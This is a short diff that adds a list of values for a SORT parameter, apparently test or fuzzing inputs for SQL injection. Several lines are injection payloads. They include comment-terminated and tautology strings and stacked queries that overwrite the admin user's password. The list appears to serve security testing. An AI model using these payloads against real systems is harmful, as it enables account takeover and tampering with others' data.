@@ -1,0 +1,9 @@
+SORT:1
+SORT:1\
+SORT:1fadfdasf
+SORT:1fadfdasf\
+SORT:1' -- 
+SORT:1' and 1=1 -- 
+SORT:1'; update users set password='51' where username='admin' -- 
+SORT:1'; update users set password='51' where username='admin' -- 
+SORT:1; update users set password='51' where username='admin' -- 
